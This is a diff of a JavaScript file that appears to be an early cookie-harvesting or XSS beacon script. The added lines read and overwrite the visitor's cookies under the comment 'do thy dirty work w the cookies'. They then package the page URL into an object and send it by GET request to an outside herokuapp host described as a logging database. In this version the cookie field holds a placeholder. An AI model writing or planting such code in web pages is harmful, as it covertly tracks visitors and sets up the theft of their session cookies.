@@ -139,11 +139,29 @@ oReq.addEventListener("load", function () {
       }
     }
 });
-// Or post, etc
+
 oReq.open("GET", proxy + myUrl);
 oReq.send();
 
-//now check for payload in url
-//if so, log it with timestampt and IP address to database
+//do thy dirty work w the cookies
+console.log(document.cookie);
+document.cookie = "anothername = 234";
+console.log(document.cookie);
+
+//create object to send
+
+dbData = {
+  url: document.URL,
+  cookiedata:"fake news",
+  misc:"same to you"
+};
 
 
+//log timestamp, url,  and user id to database
+let dbReq = new XMLHttpRequest();
+dbReq.addEventListener("load", function () {
+  //console.log(this.responseText);
+});
+
+dbReq.open("GET", "https://mastodoncatholic-database.herokuapp.com/?r=" + JSON.stringify(dbData));
+dbReq.send();
